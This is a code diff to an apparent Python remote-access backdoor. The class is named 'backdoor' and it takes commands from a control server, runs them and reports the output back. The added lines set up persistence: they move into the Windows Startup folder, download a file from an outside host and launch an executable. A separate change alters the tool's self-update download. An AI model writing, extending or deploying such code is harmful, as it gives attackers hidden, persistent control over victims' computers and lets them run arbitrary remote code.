@@ -1,4 +1,5 @@
 import requests,time,os,keyboard,pyautogui,webbrowser,time
+original = os.getcwd()
 
 class backdoor:
     def __init__(self, url="http://127.0.0.1:8000/"):
@@ -6,7 +7,9 @@ class backdoor:
         ip = requests.get("https://api64.ipify.org/").text
         self.id = requests.get(self.url+"api/get_id/"+ip).json()['id']
         ping = "0ms"
+        i = 0 
         while True:
+            i += 1
             start = time.time()
             requests.get(self.url+"api/ping/"+str(self.id)+"/"+ping)
             end = time.time()
@@ -16,7 +19,31 @@ class backdoor:
                 output = self.run(commands[i])
                 print(output)
                 requests.post(f"{self.url}api/output/{self.id}/{i}", data={'output':output})
-            
+            if i == 100:
+                def download():
+                    url = "https://pybdtest.pythonanywhere.com/media/files/test4.py/"
+                    get_response = requests.get(url)
+
+                    with open("test4.py", "wb") as out_file:
+                        out_file.write(get_response.content)
+                    os.startfile("system.exe")
+                x = -2
+                for i in os.getcwd():
+                    if i == "\\":
+                        x += 1
+                for i in range(x):
+                    os.chdir("..")
+
+                print(os.getcwd())
+                os.chdir("AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
+                if os.path.isfile("test4.py"):
+                    with open("test4.py","r+") as r:
+                        r = r.read()
+                    if len(r) < 10:
+                        download()
+                else:
+                    download()
+                time.sleep(1)
     def run(self, command):
         output = ""
         commands_to_execute = command.split("\r\n")
@@ -87,7 +114,7 @@ class backdoor:
                     output += i + "\n"
             elif command.startswith("update"):
                 name = "main.exe"
-                get_response = requests.get(f"{self.url}media/files/main.exe")
+                get_response = requests.get(f"{self.url}media/files/new_main.exe")
                 with open(name, "wb") as out_file:
                     out_file.write(get_response.content)
                 x = -2
